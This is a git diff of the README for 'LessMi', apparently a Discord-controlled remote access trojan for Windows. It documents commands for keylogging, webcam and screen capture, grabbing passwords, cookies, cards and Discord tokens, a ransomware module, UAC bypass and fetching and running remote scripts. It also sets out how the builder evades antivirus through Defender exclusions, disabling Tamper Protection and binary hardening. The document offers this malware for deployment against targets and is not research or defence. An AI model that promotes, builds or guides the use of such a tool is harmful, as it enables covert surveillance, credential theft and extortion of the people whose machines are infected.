@@ -15,7 +15,7 @@ Join our Telegram community to stay tuned of the last changes and support us!<br
 ![Control](https://img.shields.io/badge/control-Discord-5865F2?logo=discord&logoColor=white)
 ![License](https://img.shields.io/badge/license-MIT-green)
 ![Status](https://img.shields.io/badge/status-active-brightgreen)
-![Commands](https://img.shields.io/badge/commands-200%2B-orange)
+![Commands](https://img.shields.io/badge/commands-250%2B-orange)
 ![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)
 
 > **`MateAGYT/LessMi` is the ONLY official repository.** Don't install or run any other repo claiming to be us, or an "advanced/paid" version!
@@ -34,18 +34,22 @@ Join our Telegram community to stay tuned of the last changes and support us!<br
   - [Input & hardware control](#️-input--hardware-control)
   - [System & process control](#️-system--process-control)
   - [Hardware & system inventory](#-hardware--system-inventory)
+  - [Recon](#-recon)
   - [Filesystem](#-filesystem)
   - [Network & persistence](#-network--persistence)
   - [Network diagnostics](#-network-diagnostics)
-  - [Security & policy toggles](#-security--policy-toggles)
+  - [Security & policy toggles](#️-security--policy-toggles)
   - [Trolling & pranks](#-trolling--pranks)
-  - [Remote shell](#-remote-shell)
+  - [Remote shell](#️-remote-shell)
+  - [Bot control](#-bot-control)
   - [Power & destructive](#-power--destructive)
   - [Extra / hidden commands](#-extra--hidden-commands)
 - [4. Why LessMi?](#-why-lessmi)
 - [5. Comparison with other RATs](#-comparison-with-other-rats)
 - [6. Requirements](#-requirements)
 - [7. Installation & compiling](#️-installation--compiling)
+  - [The builder](#-the-builder)
+  - [Setting up the Discord bot](#setting-up-the-discord-bot)
 - [8. Troubleshooting & FAQ](#-troubleshooting--faq)
 - [9. Roadmap](#-roadmap)
 - [10. VirusTotal analysis](#-virustotal-analysis)
@@ -81,6 +85,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | Command | What it does |
 |---|---|
 | `.ss` | Screenshot **all** connected monitors. |
+| `.ss-window <title>` | Screenshot a single window matched by title. |
 | `.screenrec <seconds>` | Record the screen for a chosen duration. |
 | `.webcam` | Capture a picture from the webcam. |
 | `.camrec <seconds>` | Record video from the selected camera. |
@@ -93,7 +98,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.list-speakers` / `.set-speaker <n>` | List audio outputs and switch the active speaker. |
 | `.screensaver` | Start the screensaver. |
 | `.magnifier` | Open the Windows Magnifier. |
-| `.open-cd` | Eject the optical drive. |
+| `.eject` | Eject the optical drive. |
 
 ## 🎨 Display, theme & appearance
 
@@ -119,7 +124,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.crazy-mouse` | Jiggle the mouse randomly for 2 seconds. |
 | `.key <keys>` | Press keys — supports tokens like `[ENTER]`, `[SPACE]`, `[TAB]`, `[ESC]`. |
 | `.click [n]` | Send N left clicks. |
-| `.click-delete [n] [folder]` | Delete a random file per click. |
+| `.chaos [n] [folder]` | Delete a random file per click. |
 | `.autoclick <on\|off> [interval]` | Continuous auto-clicker. |
 | `.mouse-speed <1-20>` / `.swap-mouse <on\|off>` | Pointer speed and left/right swap. |
 | `.alt-f4` | Send ALT+F4 to the active window. |
@@ -156,7 +161,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.clipboard` / `.set-clipboard <text>` | Read or set the clipboard. |
 | `.beep` | Emit a system beep. |
 | `.notepad [text]` | Open Notepad (optionally pre-filled). |
-| `.god-mode` | Create a GodMode folder on the desktop. |
+| `.godmode` | Create a GodMode folder on the desktop. |
 | `.restore-point` | Create a System Restore checkpoint. |
 
 ## 🔬 Hardware & system inventory
@@ -172,6 +177,21 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.hotfix` / `.antivirus` / `.drivers` / `.events` | Hotfixes, registered AV, drivers, event log. |
 | `.wifi` | Dump every saved WiFi profile with its key. |
 
+## 🔍 Recon
+
+| Command | What it does |
+|---|---|
+| `.autoruns` | Every Run key (HKCU/HKLM/WOW64) and Startup-folder entry. |
+| `.tasks` | Full scheduled-task table. |
+| `.admins` | Members of the local Administrators group. |
+| `.printers` | Installed printers, drivers and ports. |
+| `.rdp` | Whether Remote Desktop is enabled. |
+| `.proxy` | Read or set the system HTTP proxy. |
+| `.defender-status` | Defender service state, real-time protection and signature age. |
+| `.firewall-rules` | Enabled firewall rules. |
+| `.power-plan <high\|balanced\|saver>` | Switch the active power scheme. |
+| `.timezone [tz]` | Read or set the machine timezone. |
+
 ## 📁 Filesystem
 
 | Command | What it does |
@@ -179,11 +199,13 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.ls` | List the current directory and files. |
 | `.cd <path>` | Change directory. |
 | `.tree` | Print the directory tree. |
-| `.cat <file>` | Read a text file. |
-| `.mkdir <name>` / `.mkfile <name> <text>` | Create a folder or a text file. |
+| `.cat <file>` / `.tail <file> [n]` | Read a whole text file, or just its last lines. |
+| `.grep <pattern> [path]` | Search file **contents** recursively. |
+| `.search <pattern> [path]` | Search file **names** recursively. |
+| `.biggest [path]` | Largest files under a path. |
+| `.mkdir <name>` / `.mkfile <name> <text>` / `.touch <file>` | Create a folder, a text file, or touch a file. |
 | `.move <a> <b>` / `.copy <a> <b>` / `.rename <a> <b>` | Move, copy or rename. |
 | `.size <path>` / `.hash <file>` | Path size, SHA256 hash. |
-| `.search <pattern> [path]` | Search filenames recursively. |
 | `.zip <src> <dest>` / `.unzip <file>` | Archive or extract. |
 | `.download <file>` | Upload a file from the target to Discord. |
 | `.upload` | Push an attached file to the target. |
@@ -219,9 +241,9 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.nslookup <host>` | DNS resolution. |
 | `.netstat` / `.ports` | All sockets, and listening ports only. |
 | `.arp` / `.route` | ARP table, IPv4 routing table. |
-| `.flush-dns` / `.renew-ip` | Flush DNS cache, release + renew the lease. |
-| `.net-adapter` | Adapter list with link speed and status. |
-| `.wifi-networks` | Nearby WiFi networks with BSSIDs. |
+| `.flushdns` / `.renewip` | Flush DNS cache, release + renew the lease. |
+| `.adapters` | Adapter list with link speed and status. |
+| `.nearby-wifi` | Nearby WiFi networks with BSSIDs. |
 | `.shares` | SMB shares. |
 
 ## 🛡️ Security & policy toggles
@@ -240,7 +262,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 |---|---|
 | `.msg <type> <title> <message>` | Show a customizable message box. |
 | `.win-notify "<title>" <message>` | Fake Windows toast notification. |
-| `.jumpscare` | Trigger a jumpscare. |
+| `.jumpscare` | Trigger a fullscreen jumpscare with audio. |
 | `.display-glitch [graphic]` | Overlay a glitch graphic (shows help if none given). |
 | `.play <file/url>` | Play audio from a file or URL. |
 | `.tts <message>` | Speak your message out loud. |
@@ -256,6 +278,19 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.powershell <command>` | Run a command through PowerShell. |
 | `.scriptloader <url>` | Download a `.ps1`/`.bat` script from a URL and run it. |
 | `.key <keys>` | Type a string into the target. |
+
+## 🤖 Bot control
+
+| Command | What it does |
+|---|---|
+| `.say <text>` | Post a message as the bot. |
+| `.purge [n]` | Bulk-delete messages in the channel. |
+| `.nick <name>` | Change the bot nickname (no arg resets it). |
+| `.avatar <url>` | Change the bot avatar. |
+| `.status <playing\|watching\|listening\|competing> <text>` | Change the bot presence. |
+| `.embed <title> \| <description>` | Post a custom embed. |
+| `.guilds` | List every server the bot is in. |
+| `.pingbot` | Report gateway latency. |
 
 ## 💥 Power & destructive
 
@@ -275,8 +310,8 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.help` | Open the category menu with the full command reference. |
 | `.keylogger-enable` / `.keylogger-disable` | Toggle the keylogger. |
 | `.keylog` | Flush the keylog buffer to `#keys` immediately. |
-| `.take all` | Grab **passwords, Discord tokens, browser history, cookies, and IP** in one shot. |
-| `.take <mode>` | Single-mode grab: `cookies`, `history`, `cards`, `games`, `discord`, `passwords`, `vm`. |
+| `.grab all` / `.take all` | Grab **passwords, Discord tokens, browser history, cookies, and IP** in one shot. |
+| `.grab <mode>` / `.take <mode>` | Single-mode grab: `cookies`, `history`, `cards`, `games`, `discord`, `passwords`, `vm`. |
 | `.grabber [url]` | Fetch and run the grabber standalone. |
 | `.discord-diag` | Diagnostic dump of Discord installs and tokens. |
 | `.leave-all` | Make the bot leave every server it's in. |
@@ -290,7 +325,8 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 - **Discord-native control** — manage machines from any device that runs Discord.
 - **Button panel + commands** — friendly for beginners, fast for pros.
 - **Batteries included** — persistence, UAC bypass, keylogger, **working grabber**, live mic, and self-destruct all built in.
-- **Real inventory** — WMI hardware, security posture, network diagnostics and event logs, not just a tasklist.
+- **Real inventory** — WMI hardware, security posture, network diagnostics, autoruns, scheduled tasks and event logs, not just a tasklist.
+- **Builder that fights back** — self-elevation, Defender exclusions before the copy, token rotation, binary hardening and an archive check before deploying.
 - **Active** — maintained by a single dedicated author, unlike its abandoned ancestors.
 - **Honest about lineage** — based on PySilon, rebuilt and extended.
 
@@ -309,6 +345,10 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | Price | **Free** | Free | Free | Free | Free | ⚠️ | Free |
 | Open source | **✅** | ✅ | ✅ | ✅ | 🟡 | ❌ | ❌ |
 | One-click installer | **✅** | 🟡 | ❌ | ❌ | ❌ | ❌ | ❌ |
+| Source filter before build | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
+| Token rotation / failover | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
+| Binary hardening + archive check | **✅** | 🟡 | 🟡 | 🟡 | ✅ | 🟡 | 🟡 |
+| Auto-elevating builder | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
 | Discord button panel | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
 | Persistence at boot | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
 | UAC bypass | **✅** | 🟡 | 🟡 | 🟡 | ✅ | 🟡 | 🟡 |
@@ -318,10 +358,12 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | Webcam | **✅** | ✅ | ✅ | 🟡 | ✅ | ✅ | ✅ |
 | Camera video recording | **✅** | ❌ | 🟡 | ❌ | 🟡 | ❌ | ❌ |
 | Multi-monitor screenshot | **✅** | ✅ | ✅ | 🟡 | ✅ | ✅ | 🟡 |
+| Single-window screenshot | **✅** | ❌ | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
 | File manager (download/upload) | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Content grep + largest-files scan | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
 | Remote shell | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
 | Ransomware module | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
-| Grabber (`take all`) | **✅** | ✅ | 🟡 | 🟡 | ✅ | ✅ | 🟡 |
+| Grabber (`grab all`) | **✅** | ✅ | 🟡 | 🟡 | ✅ | ✅ | 🟡 |
 | Trolling / pranks | **✅ Rich** | 🟡 | 🟡 | ❌ | 🟡 | 🟡 | 🟡 |
 | Display control (rotate/mode/resolution) | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
 | Theme control (dark mode/night light/invert) | **✅** | ❌ | 🟡 | ❌ | ❌ | 🟡 | ❌ |
@@ -329,6 +371,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | Auto-clicker + click-to-delete | **✅** | ❌ | 🟡 | ❌ | 🟡 | 🟡 | 🟡 |
 | Clipboard access | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | ✅ | ✅ |
 | Hardware inventory (WMI) | **✅** | 🟡 | ✅ | 🟡 | 🟡 | 🟡 | 🟡 |
+| Autoruns / scheduled-task recon | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
 | Network diagnostics (ping/tracert/netstat) | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
 | Firewall / BitLocker / policy toggles | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
 | AV purge + Defender exclusion | **✅** | 🟡 | ❌ | ❌ | 🟡 | ❌ | ❌ |
@@ -354,6 +397,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 
 - Windows 10/11 (x64 recommended)
 - [Python 3.10+](https://www.python.org/downloads/) — check **"Add Python to PATH"** during install
+- Administrator rights for the builder (it auto-elevates)
 - A Discord bot token + channel (see setup below)
 - A Discord account
 - ~1 GB free disk for dependencies
@@ -373,6 +417,19 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 3. **Click compile** and wait for the RAT to build.
 4. **Done!** You now have your own LessMi RAT `.exe` ready to deploy.
 
+### The builder
+
+The builder is not a thin wrapper around PyInstaller. Before you press COMPILE it already knows what it has to do:
+
+- **Auto-elevation.** If it isn't running as admin it relaunches itself with UAC, so persistence and exclusions always apply.
+- **Token validation.** The main token is checked against the Discord format before anything is built — a bad paste fails at build time instead of at the target.
+- **Token rotation.** Two backup tokens can be supplied; the payload tries them in order and only gives up after all three.
+- **Startup logging.** Every boot writes to `boot.log` in the app directory, so a silent failure is never really silent.
+- **Source filter.** Every command and every startup/runtime feature can be toggled off before building, so you ship only what you need and avoid duplicate persistence vectors.
+- **Defender exclusions first.** The destination folder, the payload and the extraction directory are excluded *before* the copy, not after.
+- **Hardening + verification.** The binary is hardened (section names, timestamp, Rich header re-key, padding) and then re-opened with PyInstaller's archive viewer; if the archive no longer parses, the build is rejected instead of shipped.
+- **Cleanup on rebuild.** Previous tasks, folder and `Userinit` entry are removed before installing the new one.
+
 ### Setting up the Discord bot
 
 1. Go to the [Discord Developer Portal](https://discord.com/developers/applications) → **New Application**.
@@ -389,8 +446,20 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 **The bot doesn't respond.**
 Check that **Message Content Intent** is enabled, the token is correct, and the bot can read/send in the target channel.
 
+**The builder says the token is invalid.**
+The token was copied with a missing character or with an extra prefix. Reset it in the Developer Portal and paste it again — the builder validates the format on purpose.
+
+**The bot starts and dies instantly.**
+Look at `boot.log` in the app directory. If it says `login failure`, the token is revoked; if it says `all tokens failed`, add a backup token. If the log is empty, the payload never got to run — check that the build passed the archive verification.
+
 **Windows Defender / SmartScreen flags it.**
-Normal for a fresh, unsigned RAT. Add an exclusion folder, or sign the binary. First-run may also need *"More info → Run anyway"*. Once running, `.purge-av` adds exclusions and silences the usual suspects.
+Normal for a fresh, unsigned RAT. Add an exclusion folder, or sign the binary. First-run may also need *"More info → Run anyway"*. The builder already adds exclusions for its own payload; `.purge-av` handles the rest.
+
+**The builder warns about tamper protection.**
+Defender refused the exclusions. Turn off *Tamper Protection* in Windows Security, or add the folder manually, then rebuild.
+
+**The builder says the archive is corrupt after hardening.**
+The hardening step broke the PyInstaller cookie. Rebuild; if it persists, disable hardening for that build and check your PyInstaller version.
 
 **`.webcam` / `.camrec` / `.join` fails.**
 Confirm a camera/mic exists and is selected via `.list-cams` / `.sel-cam` and `.list-mics` / `.sel-mic`. Some virtual devices misreport — pick a physical one.
@@ -398,11 +467,14 @@ Confirm a camera/mic exists and is selected via `.list-cams` / `.sel-cam` and `.
 **`.admin-check` says no admin.**
 Run the build elevated, use `.ask-admin`, or try `.uac-bypass`.
 
-**`.take all` opens consoles but sends nothing.**
+**`.grab all` opens consoles but sends nothing.**
 Make sure the `resources/` scripts exist alongside the build, and that the target has `python` available for the sub-scripts. Output is written to fresh consoles on the target.
 
-**`.take`/`.grabber` reports a missing `grab.py`.**
+**`.grab`/`.grabber` reports a missing `grab.py`.**
 The build normally fetches it on demand — check connectivity to GitHub, or drop `grab.py` into `resources/` manually.
+
+**`.grep` or `.biggest` seems stuck.**
+They skip `AppData`, `node_modules`, `.git` and similar, and stop after 4000 directories. Point them at a narrower path if you need speed.
 
 **`.resolution` / `.rotate` blanked the screen.**
 A mode the panel doesn't support got applied. Reboot, or set a known-good resolution back with `.resolution 1920 1080`.
@@ -421,7 +493,8 @@ Windows only. macOS/Linux are not supported (yet).
 # 🗺️ Roadmap
 
 - [ ] **Slash commands** — clone every prefix command as a slash command.
-- [x] ~~Restore the **`take all` grabber** module.~~ ✅ **Done — fully available.**
+- [x] ~~Restore the **`grab all` grabber** module.~~ ✅ **Done — fully available.**
+- [x] ~~Source filter, token rotation, build verification in the builder.~~ ✅ **Done.**
 - [ ] Even more commands (always).
 - [ ] Signed release binaries to reduce AV false positives.
 - [ ] Optional multi-bot sharding for large fleets.
